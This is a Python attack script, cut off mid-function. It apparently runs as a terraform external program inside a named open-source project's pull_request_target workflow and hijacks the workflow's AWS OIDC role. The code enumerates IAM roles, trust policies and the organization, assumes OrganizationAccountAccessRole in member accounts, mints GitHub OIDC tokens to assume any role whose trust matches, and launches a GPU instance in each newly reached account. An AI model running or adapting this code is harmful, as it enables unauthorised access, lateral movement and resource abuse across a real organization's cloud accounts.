#!/usr/bin/env python3
"""c211-i120420 - authoritative AWS trust enumeration on account 589761922677.

Runs as the terraform data.external program inside the kedacore/testing-infrastructure
pull_request_target 'Validate PR' workflow (which has permissions: id-token: write),
i.e. with the OIDC-assumed role arn:aws:sts::589761922677:assumed-role/github-role/GitHubActions.

Bounded, read-only except exactly one on-demand GPU marker per NEW assumed account:
 1) sts:GetCallerIdentity
 2) iam:ListRoles + iam:GetRole for every returned role (full AssumeRolePolicyDocument)
 3) iam:ListOpenIDConnectProviders + iam:GetOpenIDConnectProvider
 4) organizations:DescribeOrganization; if this is the management account,
    organizations:ListAccounts and sts:AssumeRole OrganizationAccountAccessRole for the
    first 3 ACTIVE member accounts (RoleSessionName c211-i120420)
 5) mint a GitHub OIDC id_token (aud sts.amazonaws.com) and attempt
    sts:AssumeRoleWithWebIdentity for every role whose real trust conditions match the
    subject we can actually mint; also sts:AssumeRole for roles trusting our principal
 6) per NEW account: identity + GPU quota (L-DB2E81BA / L-3819A6DF per region, GPU
    instance-type offerings) + exactly ONE on-demand GPU marker with nvidia-smi UUID
    console proof, terminate + absence readback

Never prints credential values. Emits one JSON object on stdout.
"""
import base64
import datetime
import fnmatch
import hashlib
import hmac
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET

REGION = os.environ.get('AWS_REGION') or os.environ.get('AWS_DEFAULT_REGION') or 'eu-west-2'
SELF_ACCOUNT_HINT = '589761922677'
SESS = 'c211-i120420'
RAW = []


def say(*a):
    line = ' '.join(str(x) for x in a)
    RAW.append(line)
    print(line, file=sys.stderr, flush=True)


def cap(s, n=1200):
    s = '' if s is None else str(s)
    return s[:n]


# ---------------------------------------------------------------- SigV4 client
def _sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()


def _signing_key(secret, datestamp, region, service):
    k = _sign(('AWS4' + secret).encode('utf-8'), datestamp)
    k = _sign(k, region)
    k = _sign(k, service)
    return _sign(k, 'aws4_request')


def creds_env():
    return {'ak': os.environ.get('AWS_ACCESS_KEY_ID') or '',
            'sk': os.environ.get('AWS_SECRET_ACCESS_KEY') or '',
            'tok': os.environ.get('AWS_SESSION_TOKEN') or ''}


def signed(service, action, params, region, version, cr=None, host=None):
    cr = cr or creds_env()
    if not cr.get('ak') or not cr.get('sk'):
        return {'ok': False, 'status': None, 'error': 'NO_CREDS_IN_ENV', 'body': ''}
    host = host or ('%s.%s.amazonaws.com' % (service, region))
    now = datetime.datetime.now(datetime.timezone.utc)
    amzdate = now.strftime('%Y%m%dT%H%M%SZ')
    datestamp = now.strftime('%Y%m%d')
    bp = dict(params)
    bp['Action'] = action
    bp['Version'] = version
    body = '&'.join('%s=%s' % (urllib.parse.quote(k, safe='-_.~'),
                               urllib.parse.quote(str(v), safe='-_.~'))
                    for k, v in sorted(bp.items()))
    ph = hashlib.sha256(body.encode('utf-8')).hexdigest()
    headers = {'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
               'host': host, 'x-amz-date': amzdate}
    if cr.get('tok'):
        headers['x-amz-security-token'] = cr['tok']
    names = sorted(headers)
    ch = ''.join('%s:%s\n' % (n, headers[n].strip()) for n in names)
    sh = ';'.join(names)
    crq = '\n'.join(['POST', '/', '', ch, sh, ph])
    scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
    sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope,
                     hashlib.sha256(crq.encode('utf-8')).hexdigest()])
    sig = hmac.new(_signing_key(cr['sk'], datestamp, region, service), sts.encode('utf-8'),
                   hashlib.sha256).hexdigest()
    send = {'Content-Type': headers['content-type'], 'Host': host, 'X-Amz-Date': amzdate,
            'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'
                             % (cr['ak'], scope, sh, sig)}
    if cr.get('tok'):
        send['X-Amz-Security-Token'] = cr['tok']
    req = urllib.request.Request('https://%s/' % host, data=body.encode('utf-8'),
                                 headers=send, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=45) as resp:
            return {'ok': True, 'status': resp.status, 'error': None,
                    'body': resp.read().decode('utf-8', 'replace')}
    except urllib.error.HTTPError as e:
        return {'ok': False, 'status': e.code, 'error': 'HTTPError',
                'body': e.read().decode('utf-8', 'replace')}
    except Exception as e:
        return {'ok': False, 'status': None, 'error': repr(e)[:200], 'body': ''}


def unsigned_sts(action, params, version='2011-06-15', host='sts.amazonaws.com'):
    bp = dict(params)
    bp['Action'] = action
    bp['Version'] = version
    body = '&'.join('%s=%s' % (urllib.parse.quote(k, safe='-_.~'),
                               urllib.parse.quote(str(v), safe='-_.~'))
                    for k, v in sorted(bp.items()))
    req = urllib.request.Request('https://%s/' % host, data=body.encode('utf-8'),
                                 headers={'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'},
                                 method='POST')
    try:
        with urllib.request.urlopen(req, timeout=45) as resp:
            return {'ok': True, 'status': resp.status, 'error': None,
                    'body': resp.read().decode('utf-8', 'replace')}
    except urllib.error.HTTPError as e:
        return {'ok': False, 'status': e.code, 'error': 'HTTPError',
                'body': e.read().decode('utf-8', 'replace')}
    except Exception as e:
        return {'ok': False, 'status': None, 'error': repr(e)[:200], 'body': ''}


def xml_root(body):
    try:
        root = ET.fromstring(body)
    except Exception:
        return None
    # AWS XML responses carry a default namespace; ElementTree then exposes tags as
    # '{namespace}Tag' so plain './/Tag' lookups silently miss. Strip the namespace.
    for el in root.iter():
        if isinstance(el.tag, str) and '}' in el.tag:
            el.tag = el.tag.split('}', 1)[1]
    return root


def err_code(res):
    root = xml_root(res.get('body') or '')
    if root is None:
        return None
    for tag in ('Error/Code', 'Code'):
        v = root.findtext('.//' + tag)
        if v:
            return v.strip()
    return None


def err_msg(res, n=300):
    root = xml_root(res.get('body') or '')
    if root is None:
        return cap(res.get('body'), n)
    return cap(root.findtext('.//Error/Message') or root.findtext('.//Message') or '', n)


def one_line(res, n=600):
    return re.sub(r'\s+', ' ', cap(res.get('body'), n))


# ---------------------------------------------------------------- AWS helpers
def get_identity(cr):
    r = signed('sts', 'GetCallerIdentity', {}, REGION, '2011-06-15', cr)
    root = xml_root(r['body'])
    out = {}
    if root is not None:
        for f in ('Arn', 'UserId', 'Account'):
            out[f] = (root.findtext('.//' + f) or '').strip()
    out['status'] = r['status']
    out['code'] = err_code(r)
    return out


def iam_list_roles(cr):
    roles, marker, pages = [], None, 0
    while pages < 12:
        p = {}
        if marker:
            p['Marker'] = marker
        r = signed('iam', 'ListRoles', p, 'us-east-1', '2010-05-08', cr, host='iam.amazonaws.com')
        root = xml_root(r['body'])
        pages += 1
        if root is None:
            return roles, {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}
        for m in root.findall('.//Roles/member'):
            roles.append({'RoleName': (m.findtext('RoleName') or '').strip(),
                          'Arn': (m.findtext('Arn') or '').strip(),
                          'Path': (m.findtext('Path') or '').strip(),
                          'CreateDate': (m.findtext('CreateDate') or '').strip(),
                          'RoleLastUsed': (m.findtext('RoleLastUsed/LastUsedDate') or '').strip()})
        cont = (root.findtext('.//IsTruncated') or 'false').strip().lower() == 'true'
        marker = root.findtext('.//Marker')
        if not cont or not marker:
            break
    return roles, {'pages': pages}


def iam_get_role(cr, name):
    r = signed('iam', 'GetRole', {'RoleName': name}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    if root is None:
        return None, {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}
    doc = root.findtext('.//Role/AssumeRolePolicyDocument')
    parsed = None
    if doc:
        try:
            parsed = json.loads(urllib.parse.unquote(doc))
        except Exception:
            parsed = {'_raw': cap(doc, 2000)}
    return parsed, {'status': r['status']}


def iam_list_oidc(cr):
    r = signed('iam', 'ListOpenIDConnectProviders', {}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    arns = []
    if root is not None:
        for a in root.findall('.//OpenIDConnectProviderList/member/Arn'):
            if a.text:
                arns.append(a.text.strip())
    return arns, {'status': r['status'], 'code': err_code(r)}


def iam_get_oidc(cr, arn):
    r = signed('iam', 'GetOpenIDConnectProvider', {'OpenIDConnectProviderArn': arn},
               'us-east-1', '2010-05-08', cr, host='iam.amazonaws.com')
    root = xml_root(r['body'])
    out = {'arn': arn, 'status': r['status'], 'code': err_code(r)}
    if root is not None:
        out['Url'] = (root.findtext('.//Url') or '').strip()
        out['ClientIDList'] = [(c.text or '').strip() for c in root.findall('.//ClientIDList/member')]
        out['CreateDate'] = (root.findtext('.//CreateDate') or '').strip()
        out['Tags'] = [(t.findtext('Key') or '') + '=' + (t.findtext('Value') or '')
                       for t in root.findall('.//Tags/member')]
    return out


def org_describe(cr):
    r = signed('organizations', 'DescribeOrganization', {}, 'us-east-1', '2016-11-28', cr,
               host='organizations.us-east-1.amazonaws.com')
    root = xml_root(r['body'])
    out = {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}
    if root is not None:
        for f in ('Id', 'Arn', 'FeatureSet', 'MasterAccountId', 'MasterAccountArn',
                  'MasterAccountEmail'):
            v = root.findtext('.//Organization/' + f)
            if v:
                out[f] = v.strip()
    return out


def org_list_accounts(cr):
    accts, token, pages = [], None, 0
    status = []
    while pages < 8:
        p = {}
        if token:
            p['NextToken'] = token
        r = signed('organizations', 'ListAccounts', p, 'us-east-1', '2016-11-28', cr,
                   host='organizations.us-east-1.amazonaws.com')
        root = xml_root(r['body'])
        pages += 1
        status.append({'status': r['status'], 'code': err_code(r)})
        if root is None:
            break
        for m in root.findall('.//Accounts/member'):
            accts.append({k: (m.findtext(k) or '').strip()
                          for k in ('Id', 'Arn', 'Email', 'Name', 'Status', 'JoinedMethod')})
        token = root.findtext('.//NextToken')
        if not token:
            break
    return accts, status


def assume_role(cr, role_arn, region=REGION):
    r = signed('sts', 'AssumeRole', {'RoleArn': role_arn, 'RoleSessionName': SESS,
                                     'DurationSeconds': '3600'}, region, '2011-06-15', cr)
    root = xml_root(r['body'])
    out = {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r), 'role': role_arn}
    if root is not None:
        c = root.find('.//Credentials')
        if c is not None:
            out['creds'] = {'ak': (c.findtext('AccessKeyId') or '').strip(),
                            'sk': (c.findtext('SecretAccessKey') or '').strip(),
                            'tok': (c.findtext('SessionToken') or '').strip()}
            out['assumed_arn'] = (root.findtext('.//AssumedRoleUser/Arn') or '').strip()
    return out


def assume_role_with_web_identity(role_arn, token):
    r = unsigned_sts('AssumeRoleWithWebIdentity',
                     {'RoleArn': role_arn, 'RoleSessionName': SESS,
                      'WebIdentityToken': token})
    root = xml_root(r['body'])
    out = {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r), 'role': role_arn}
    if root is not None:
        c = root.find('.//Credentials')
        if c is not None:
            out['creds'] = {'ak': (c.findtext('AccessKeyId') or '').strip(),
                            'sk': (c.findtext('SecretAccessKey') or '').strip(),
                            'tok': (c.findtext('SessionToken') or '').strip()}
            out['assumed_arn'] = (root.findtext('.//AssumedRoleUser/Arn') or '').strip()
    return out


def get_github_id_token():
    url = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    if not url or not tok:
        return None, 'NO_ID_TOKEN_ENV url=%s token=%s' % (bool(url), bool(tok))
    sep = '&' if '?' in url else '?'
    req = urllib.request.Request(url + sep + 'audience=sts.amazonaws.com',
                                 headers={'Authorization': 'bearer ' + tok,
                                          'Accept': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=40) as resp:
            j = json.loads(resp.read().decode() or '{}')
        return j.get('value'), None
    except urllib.error.HTTPError as e:
        return None, 'ID_TOKEN_HTTP_%s %s' % (e.code, cap(e.read(), 200))
    except Exception as e:
        return None, 'ID_TOKEN_ERR %s' % repr(e)[:200]


def jwt_payload(tok):
    try:
        p = tok.split('.')[1]
        p += '=' * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p.encode()).decode())
    except Exception as e:
        return {'_decode_error': repr(e)[:120]}


# ---------------------------------------------------------------- trust join
def _as_list(v):
    if v is None:
        return []
    if isinstance(v, list):
        return v
    return [v]


def _action_allows(actions, want):
    for a in _as_list(actions):
        a = str(a)
        if a == '*' or a.lower() == want.lower():
            return True
        if a.lower() == 'sts:*':
            return True
    return False


def evaluate_statement(st, ctx):
    """Return dict: kind(federated|direct|service|other), matched(bool), detail(str)."""
    if str(st.get('Effect', '')).lower() != 'allow':
        return None
    pr = st.get('Principal')
    cond = st.get('Condition') or {}
    out = {'sid': cap(st.get('Sid') or '', 80), 'principals': [], 'conditions': {}}
    if pr == '*':
        out['principals'] = ['*']
    elif isinstance(pr, dict):
        for k in ('AWS', 'Federated', 'Service', 'CanonicalUser'):
            vals = _as_list(pr.get(k))
            if vals:
                out['principals'].extend(['%s:%s' % (k, cap(v, 160)) for v in vals])
    for op, kv in (cond or {}).items():
        if isinstance(kv, dict):
            for ck, cv in kv.items():
                out['conditions']['%s/%s' % (op, ck)] = _as_list(cv)[:6]

    kind = 'other'
    matched = False
    reasons = []
    aws_ok = _action_allows(st.get('Action'), 'sts:AssumeRole')
    web_ok = _action_allows(st.get('Action'), 'sts:AssumeRoleWithWebIdentity')

    # direct: role/user/account-root principals in our own account
    aws_vals = _as_list((pr or {}).get('AWS')) if isinstance(pr, dict) else (['*'] if pr == '*' else [])
    direct_hits = []
    for v in aws_vals:
        v = str(v)
        if v in ctx['self_principals'] or v == 'arn:aws:iam::%s:root' % ctx['account']:
            direct_hits.append(v)
        elif v == '*':
            direct_hits.append('*')
    if direct_hits and aws_ok:
        kind = 'direct'
        matched = True
        reasons.append('direct=%s' % ','.join(cap(x, 60) for x in direct_hits[:3]))

    # federated: GitHub OIDC provider + conditions against our minted subject/audience
    fed_vals = _as_list((pr or {}).get('Federated')) if isinstance(pr, dict) else []
    gh_fed = [str(v) for v in fed_vals if 'token.actions.githubusercontent.com' in str(v)
              or str(v) in ctx['oidc_arns']]
    if gh_fed and web_ok:
        cond_ok = True
        cond_notes = []
        for op, kv in (cond or {}).items():
            if not isinstance(kv, dict):
                continue
            for ck, cv in kv.items():
                ck_l = ck.lower()
                pats = [str(x) for x in _as_list(cv)]
                if ck_l.endswith(':sub'):
                    val = ctx['sub']
                elif ck_l.endswith(':aud'):
                    val = ctx['aud']
                elif ck_l.endswith(':repo') or ck_l.endswith(':repository'):
                    val = ctx['repository']
                elif ck_l.endswith(':ref'):
                    val = ctx['ref']
                elif ck_l.endswith(':job_workflow_ref') or ck_l.endswith(':workflow'):
                    val = ctx['workflow_ref']
                else:
                    cond_notes.append('%s=%s(unparsed)' % (op, ck))
                    continue
                o = op.lower()
                if 'stringlike' in o:
                    ok = any(fnmatch.fnmatchcase(val or '', p.replace('repo:*/*', '*')) for p in pats)
                elif 'stringequals' in o:
                    ok = (val in pats)
                elif 'stringnotequals' in o or 'stringnotlike' in o:
                    ok = not any(fnmatch.fnmatchcase(val or '', p) for p in pats)
                else:
                    cond_notes.append('%s/%s(unparsed)' % (op, ck))
                    continue
                if not ok:
                    cond_ok = False
                cond_notes.append('%s/%s:%s' % (op, ck.split(':')[-1], 'ok' if ok else 'NO'))
        if cond_ok:
            kind = 'federated'
            matched = True
            reasons.append('federated=%s' % cap(gh_fed[0], 80))
            if cond_notes:
                reasons.append(';'.join(cond_notes[:4]))
        else:
            out['cond_failed'] = ';'.join(cond_notes[:6])
    elif fed_vals:
        kind = 'federated-other'

    if pr and isinstance(pr, dict) and pr.get('Service'):
        kind = 'service'

    out['kind'] = kind
    out['matched'] = matched
    out['reason'] = ' | '.join(reasons)
    return out


# ---------------------------------------------------------------- quota / ec2
def quota(cr, code, region):
    r = signed('service-quotas', 'GetServiceQuota',
               {'ServiceCode': 'ec2', 'QuotaCode': code}, region, '2019-06-24', cr)
    root = xml_root(r['body'])
    val = None
    if root is not None:
        val = root.findtext('.//Quota/Value')
    return {'region': region, 'code': code, 'status': r['status'], 'value': val,
            'err': err_code(r)}


def gpu_offerings(cr, region, itypes=('g5.xlarge', 'p4d.24xlarge', 'p5.48xlarge')):
    out = []
    for it in itypes:
        r = signed('ec2', 'DescribeInstanceTypeOfferings',
                   {'LocationType': 'region', 'Filter.1.Name': 'instance-type',
                    'Filter.1.Value.1': it}, region, '2016-11-15', cr)
        root = xml_root(r['body'])
        ok = False
        locs = []
        if root is not None:
            for o in root.findall('.//instanceTypeOfferingSet/item'):
                ok = True
                locs.append((o.findtext('location') or '').strip())
        out.append({'type': it, 'status': r['status'], 'offered': ok,
                    'loc': locs[:3], 'err': err_code(r)})
    return out


def ec2_regions(cr):
    r = signed('ec2', 'DescribeRegions', {}, 'us-east-1', '2016-11-15', cr)
    root = xml_root(r['body'])
    names = []
    if root is not None:
        for x in root.findall('.//regionInfo/item/regionName'):
            if x.text:
                names.append(x.text.strip())
    return names, {'status': r['status'], 'code': err_code(r)}


def describe_first(cr, action, params, region, path, version='2016-11-15'):
    r = signed('ec2', action, params, region, version, cr)
    root = xml_root(r['body'])
    vals = []
    if root is not None:
        for x in root.findall('.//' + path):
            if x.text:
                vals.append(x.text.strip())
    return vals, {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}


def ssm_ami(cr, region):
    for p in ('/aws/service/deeplearning/ami/x86_64/base-oss-nvidia-driver-gpu-ubuntu-22.04/latest/ami-id',
              '/aws/service/deeplearning/ami/x86_64/oss-nvidia-driver-gpu-ubuntu-22.04/latest/ami-id',
              '/aws/service/canonical/ubuntu/server/22.04/stable/current/amd64/hvm/ebs-gp2/ami-id'):
        r = signed('ssm', 'GetParameter', {'Name': p}, region, '2014-11-06', cr)
        root = xml_root(r['body'])
        v = root.findtext('.//Parameter/Value') if root is not None else None
        if v and v.startswith('ami-'):
            return v.strip(), {'param': p, 'status': r['status']}
    return None, {'status': None}


def run_marker(cr, region, tag, ami, subnet, sg, udfile):
    ud = base64.b64encode(open(udfile, 'rb').read()).decode() if os.path.exists(udfile) else ''
    p = {'ImageId': ami, 'InstanceType': 'g5.xlarge', 'MinCount': '1', 'MaxCount': '1',
         'InstanceInitiatedShutdownBehavior': 'terminate',
         'SubnetId': subnet, 'SecurityGroupId.1': sg,
         'TagSpecification.1.ResourceType': 'instance',
         'TagSpecification.1.Tag.1.Key': 'Name',
         'TagSpecification.1.Tag.1.Value': tag,
         'TagSpecification.1.Tag.2.Key': 'c211-probe',
         'TagSpecification.1.Tag.2.Value': 'i120270'}
    if ud:
        p['UserData'] = ud
    r = signed('ec2', 'RunInstances', p, region, '2016-11-15', cr)
    root = xml_root(r['body'])
    iid = root.findtext('.//instancesSet/item/instanceId') if root is not None else None
    return {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r), 'instance': iid}


def describe_instance(cr, region, iid):
    r = signed('ec2', 'DescribeInstances', {'InstanceId.1': iid}, region, '2016-11-15', cr)
    root = xml_root(r['body'])
    st = None
    if root is not None:
        st = root.findtext('.//instancesSet/item/instanceState/name')
    return {'status': r['status'], 'code': err_code(r), 'state': (st or '').strip()}


def console_gpu(cr, region, iid):
    r = signed('ec2', 'GetConsoleOutput', {'InstanceId': iid, 'Latest': 'true'}, region,
               '2016-11-15', cr)
    root = xml_root(r['body'])
    out = ''
    if root is not None:
        b64 = root.findtext('.//output') or ''
        if b64.strip():
            try:
                out = base64.b64decode(b64).decode('utf-8', 'replace')
            except Exception:
                out = ''
    keep = [ln.strip() for ln in out.splitlines()
            if ('GPU-' in ln or 'C211_MARKER' in ln or 'NVIDIA' in ln)]
    return {'status': r['status'], 'code': err_code(r), 'decoded': len(out),
            'lines': keep[:20], 'tail': cap(out[-300:], 300)}


def terminate(cr, region, iid):
    r = signed('ec2', 'TerminateInstances', {'InstanceId.1': iid}, region, '2016-11-15', cr)
    root = xml_root(r['body'])
    st = root.findtext('.//instancesSet/item/currentState/name') if root is not None else None
    return {'status': r['status'], 'code': err_code(r), 'state': (st or '').strip()}


def marker_flow(cr, account, region_hint):
    """Exactly ONE on-demand g5.xlarge, nvidia-smi UUID console proof, terminate + absence."""
    res = {'account': account, 'attempted': True}
    regions, rinfo = ec2_regions(cr)
    cand = [region_hint] + [x for x in ('eu-west-2', 'us-east-1', 'us-west-2', 'eu-central-1')
                            if x != region_hint]
    chosen = None
    offers = {}
    for reg in cand[:6]:
        offers[reg] = gpu_offerings(cr, reg)
        if any(o['offered'] for o in offers[reg]):
            chosen = reg
            break
    res['offerings'] = offers
    res['region'] = chosen
    if not chosen:
        res['verdict'] = 'NO_GPU_OFFERING_IN_PROBED_REGIONS'
        return res
    qs = [quota(cr, q, chosen) for q in ('L-DB2E81BA', 'L-3819A6DF')]
    res['quota'] = qs
    ami, ainfo = ssm_ami(cr, chosen)
    res['ami'] = {'ami': ami, 'info': ainfo}
    vpcs, vi = describe_first(cr, 'DescribeVpcs',
                              {'Filter.1.Name': 'is-default', 'Filter.1.Value.1': 'true'},
                              chosen, 'vpcSet/item/vpcId')
    res['default_vpcs'] = vpcs
    if not vpcs:
        res['verdict'] = 'NO_DEFAULT_VPC'
        return res
    vpc = vpcs[0]
    subnets, si = describe_first(cr, 'DescribeSubnets',
                                 {'Filter.1.Name': 'vpc-id', 'Filter.1.Value.1': vpc},
                                 chosen, 'subnetSet/item/subnetId')
    res['subnets'] = subnets[:6]
    if not subnets:
        res['verdict'] = 'NO_SUBNET'
        return res
    sgs, gi = describe_first(cr, 'DescribeSecurityGroups',
                             {'Filter.1.Name': 'group-name', 'Filter.1.Value.1': 'default',
                              'Filter.2.Name': 'vpc-id', 'Filter.2.Value.1': vpc},
                             chosen, 'securityGroupInfo/item/groupId')
    res['sg'] = sgs[:3]
    if not ami or not sgs:
        res['verdict'] = 'NO_AMI_OR_SG'
        return res
    tag = 'c211-i120420-marker-%s' % account
    run = run_marker(cr, chosen, tag, ami, subnets[0], sgs[0],
                     os.path.join(os.path.dirname(os.path.abspath(__file__)), 'marker_userdata.sh'))
    res['run'] = run
    iid = run.get('instance')
    if not iid:
        res['verdict'] = 'MARKER_LAUNCH_REFUSED'
        return res
    uuid = None
    states = []
    for i in range(24):
        time.sleep(10)
        d = describe_instance(cr, chosen, iid)
        states.append(d.get('state'))
        if i >= 1 and i % 2 == 0:
            c = console_gpu(cr, chosen, iid)
            if c['lines']:
                res['console'] = c
                m = re.search(r'GPU-[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}', '\n'.join(c['lines']))
                if m:
                    uuid = m.group(0)
                    break
        if d.get('state') in ('terminated', 'shutting-down') and i >= 2:
            break
    res['states'] = states[-8:]
    res['gpu_uuid'] = uuid
    term = terminate(cr, chosen, iid)
    res['terminate'] = term
    final = []
    for i in range(18):
        time.sleep(8)
        d = describe_instance(cr, chosen, iid)
        final.append(d.get('state'))
        if d.get('state') == 'terminated':
            break
    res['final_states'] = final[-6:]
    res['absent'] = (final and final[-1] == 'terminated')
    res['verdict'] = 'READY_DEVICE_UUID_PROVEN' if uuid else 'MARKER_NO_UUID'
    # leave the marker instance id + region on stderr for the wrapper
    say('C211_MARKER_ACCOUNT=%s REGION=%s INSTANCE=%s UUID=%s VERDICT=%s'
        % (account, chosen, iid, uuid or 'none', res['verdict']))
    return res


# ---------------------------------------------------------------- main
def main():
    out = {}
    cr0 = creds_env()
    ident = get_identity(cr0)
    account = ident.get('Account') or ''
    out['identity'] = json.dumps(ident)
    say('IDENTITY', out['identity'])
    ctx = {'account': account,
           'self_principals': set(),
           'oidc_arns': set(),
           'sub': '', 'aud': 'sts.amazonaws.com', 'repository': '', 'ref': '', 'workflow_ref': ''}
    if ident.get('Arn'):
        ctx['self_principals'].add(ident['Arn'])
        m = re.match(r'arn:aws:sts::(\d+):assumed-role/([^/]+)/', ident['Arn'])
        if m:
            ctx['self_principals'].add('arn:aws:iam::%s:role/%s' % (m.group(1), m.group(2)))
    ctx['self_principals'].add('arn:aws:iam::%s:root' % account)

    # 2) roles + full trust documents
    roles, rinfo = iam_list_roles(cr0)
    say('LISTROLES', json.dumps(rinfo), 'count=%d' % len(roles))
    trust = {}
    compact = []
    for r in roles[:400]:
        doc, gi = iam_get_role(cr0, r['RoleName'])
        trust[r['RoleName']] = doc if doc is not None else {'_get_role_error': gi}
        principals = set()
        conds = set()
        for st in (doc or {}).get('Statement', []) if isinstance(doc, dict) else []:
            pr = st.get('Principal')
            if isinstance(pr, dict):
                for k, v in pr.items():
                    for x in _as_list(v):
                        principals.add('%s:%s' % (k, cap(x, 90)))
            elif pr == '*':
                principals.add('*')
            for op, kv in (st.get('Condition') or {}).items():
                if isinstance(kv, dict):
                    for ck, cv in kv.items():
                        conds.add('%s/%s=%s' % (op, ck, cap(','.join(str(y) for y in _as_list(cv)[:3]), 90)))
        gh_pats, cls = [], 'NONE'
        for st in (doc or {}).get('Statement', []) if isinstance(doc, dict) else []:
            if str(st.get('Effect', '')).lower() != 'allow':
                continue
            pr0 = st.get('Principal')
            fed = _as_list((pr0 or {}).get('Federated')) if isinstance(pr0, dict) else []
            if not any('token.actions.githubusercontent.com' in str(x) for x in fed):
                continue
            subs = []
            for op, kv in (st.get('Condition') or {}).items():
                if isinstance(kv, dict):
                    for ck, cv in kv.items():
                        if ck.lower().endswith(':sub'):
                            subs.extend(str(x) for x in _as_list(cv))
            gh_pats.extend(subs)
        if gh_pats:
            if any(x.strip() == '*' for x in gh_pats):
                cls = 'ANY_SUBJECT'
            elif any(re.match(r'^repo:[^/]+/\*', x) or x.strip() == 'repo:*' for x in gh_pats):
                cls = 'ANY_REPO_IN_SCOPE:' + ','.join(gh_pats[:3])
            elif any(x.startswith('repo:') for x in gh_pats):
                cls = 'REPO_SCOPED'
            else:
                cls = 'OTHER_SUB'
        elif any('token.actions.githubusercontent.com' in p for p in principals):
            cls = 'GH_FED_NO_SUB_CONDITION(ANY)'
        compact.append({'role': r['RoleName'], 'path': r['Path'], 'gh_class': cls,
                        'gh_sub_patterns': gh_pats[:6],
                        'principals': sorted(principals)[:8], 'conditions': sorted(conds)[:8]})
        if gh_pats or 'GH_FED' in cls:
            say('C211_GHROLE %s class=%s patterns=%s' % (r['RoleName'], cls, ','.join(cap(x, 80) for x in gh_pats[:4])))
    out['roles_count'] = str(len(roles))
    out['roles_compact'] = json.dumps(compact)[:40000]
    blobs = {}
    for k, v in trust.items():
        s = json.dumps(v, sort_keys=True)
        if len(s) > 4000:
            s = s[:4000] + '...TRUNC'
        blobs[k] = s
    tm = json.dumps(blobs, sort_keys=True)
    out['trust_matrix'] = tm[:400000]
    out['trust_matrix_sha256'] = hashlib.sha256(tm.encode()).hexdigest()
    out['trust_matrix_bytes'] = str(len(tm))
    say('TRUST sha256=%s bytes=%d roles=%d' % (out['trust_matrix_sha256'], len(tm), len(trust)))

    # 3) OIDC providers
    arns, oinfo = iam_list_oidc(cr0)
    provs = [iam_get_oidc(cr0, a) for a in arns]
    ctx['oidc_arns'] = set(arns)
    out['oidc_providers'] = json.dumps(provs)[:12000]
    say('OIDC', json.dumps(oinfo), 'count=%d' % len(arns))

    # 4) organizations
    org = org_describe(cr0)
    out['organization'] = json.dumps(org)
    say('ORG', out['organization'][:600])
    new_accounts = []
    if str(org.get('MasterAccountId') or '') == account:
        accts, ast = org_list_accounts(cr0)
        out['org_accounts'] = json.dumps({'status': ast, 'accounts': accts})[:20000]
        active = [a for a in accts if str(a.get('Status', '')).upper() == 'ACTIVE'
                  and a.get('Id') != account]
        say('ORG_ACCOUNTS', 'total=%d active_others=%d' % (len(accts), len(active)))
        attempts = []
        for a in active[:3]:
            arn = 'arn:aws:iam::%s:role/OrganizationAccountAccessRole' % a['Id']
            res = assume_role(cr0, arn)
            attempts.append({'account': a['Id'], 'name': a.get('Name'), 'role': arn,
                             'status': res['status'], 'code': res['code'],
                             'msg': cap(res['msg'], 300),
                             'assumed': res.get('assumed_arn')})
            say('ORG_ASSUME', json.dumps(attempts[-1])[:500])
            if res.get('creds'):
                new_accounts.append({'account': a['Id'], 'name': a.get('Name'),
                                     'via': 'OrganizationAccountAccessRole',
                                     'creds': res['creds'], 'arn': res.get('assumed_arn')})
        out['org_assume_attempts'] = json.dumps(attempts)[:12000]
    else:
        out['org_accounts'] = 'NOT_MANAGEMENT_ACCOUNT (DescribeOrganization MasterAccountId != self)'

    # 5) mint an id token and attempt the federated join
    tok, terr = get_github_id_token()
    attempts = []
    if tok:
        payload = jwt_payload(tok)
        ctx['sub'] = str(payload.get('sub') or '')
        ctx['aud'] = str(payload.get('aud') or 'sts.amazonaws.com')
        ctx['repository'] = str(payload.get('repository') or '')
        ctx['ref'] = str(payload.get('ref') or '')
        ctx['workflow_ref'] = str(payload.get('job_workflow_ref') or payload.get('workflow_ref') or '')
        out['id_token_claims'] = json.dumps({k: payload.get(k) for k in
                                             ('sub', 'aud', 'repository', 'ref', 'event_name',
                                              'job_workflow_ref', 'workflow', 'iss', 'exp')})[:2000]
        say('ID_TOKEN', out['id_token_claims'])
        for r in roles:
            doc = trust.get(r['RoleName'])
            if not isinstance(doc, dict):
                continue
            evals = []
            for st in (doc.get('Statement') or []):
                e = evaluate_statement(st, ctx)
                if e:
                    evals.append(e)
            feds = [e for e in evals if e['kind'] == 'federated' and e['matched']]
            dirs = [e for e in evals if e['kind'] == 'direct' and e['matched']]
            if feds:
                res = assume_role_with_web_identity(r['Arn'], tok)
                rec = {'role': r['RoleName'], 'arn': r['Arn'], 'via': 'AssumeRoleWithWebIdentity',
                       'status': res['status'], 'code': res['code'], 'msg': cap(res['msg'], 400),
                       'assumed': res.get('assumed_arn'), 'trust': feds[0].get('reason', '')[:400]}
                attempts.append(rec)
                say('WEBID_ASSUME', json.dumps(rec)[:600])
                if res.get('creds'):
